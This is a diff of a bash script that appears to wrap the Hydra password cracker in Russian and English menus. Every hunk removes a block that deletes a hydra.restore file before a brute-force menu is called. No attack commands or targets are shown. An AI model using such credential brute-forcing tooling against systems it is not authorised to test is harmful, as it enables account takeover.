@@ -13275,9 +12901,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -13346,9 +12970,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -13417,9 +13039,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -13489,9 +13109,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -13560,9 +13178,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -13632,9 +13248,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -13704,9 +13318,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -13775,9 +13387,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -13847,9 +13457,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -13919,9 +13527,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -13991,9 +13597,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -14063,9 +13667,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -14135,9 +13737,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -14207,9 +13807,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -14278,9 +13876,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -14349,9 +13945,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -14421,9 +14015,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -14492,9 +14084,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -14563,9 +14153,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -14634,9 +14222,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -14705,9 +14291,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -14776,9 +14360,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -14848,9 +14430,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -14919,9 +14499,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -14991,9 +14569,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -15064,9 +14640,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 else
@@ -15128,9 +14702,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 if [ "$menuoption" = "5" ]; then
@@ -15420,9 +14992,7 @@ clear
 echo -e "$red-------------------------------------------------------------------------------$colorbase"    
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 else
@@ -15480,9 +15050,7 @@ echo ""
 echo -e "$red-------------------------------------------------------------------------------$colorbase"    
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 else
@@ -15493,9 +15061,7 @@ clear
 echo -e "$red-------------------------------------------------------------------------------$colorbase"    
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 else
@@ -15560,9 +15126,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 else
@@ -15624,9 +15188,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 else
@@ -15691,9 +15253,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -15758,9 +15318,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 else
@@ -15824,9 +15382,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 else
@@ -15891,9 +15447,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 else
@@ -15957,9 +15511,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 else
@@ -16022,9 +15574,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 else
@@ -16087,9 +15637,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -16153,9 +15701,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -16219,9 +15765,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -16285,9 +15829,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -16352,9 +15894,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -16419,9 +15959,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -16486,9 +16024,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -16553,9 +16089,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -16620,9 +16154,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -16687,9 +16219,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -16754,9 +16284,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -16821,9 +16349,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -16888,9 +16414,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -16954,9 +16478,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -17020,9 +16542,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -17086,9 +16606,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -17153,9 +16671,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -17219,9 +16735,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -17286,9 +16800,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -17353,9 +16865,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -17420,9 +16930,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -17487,9 +16995,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -17554,9 +17060,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -17621,9 +17125,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -17687,9 +17189,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -17754,9 +17254,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -17820,9 +17318,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -17886,9 +17382,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 else
@@ -17951,9 +17445,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -18018,9 +17510,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -18085,9 +17575,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -18152,9 +17640,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -18219,9 +17705,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -18286,9 +17770,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -18353,9 +17835,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -18420,9 +17900,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -18487,9 +17965,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -18554,9 +18030,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -18621,9 +18095,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -18688,9 +18160,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -18755,9 +18225,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -18822,9 +18290,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -18889,9 +18355,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -18956,9 +18420,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -19023,9 +18485,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -19090,9 +18550,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -19157,9 +18615,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -19224,9 +18680,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -19291,9 +18745,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -19358,9 +18810,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -19425,9 +18875,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -19492,9 +18940,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -19559,9 +19005,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -19626,9 +19070,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -19693,9 +19135,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -19759,9 +19199,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -19826,9 +19264,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
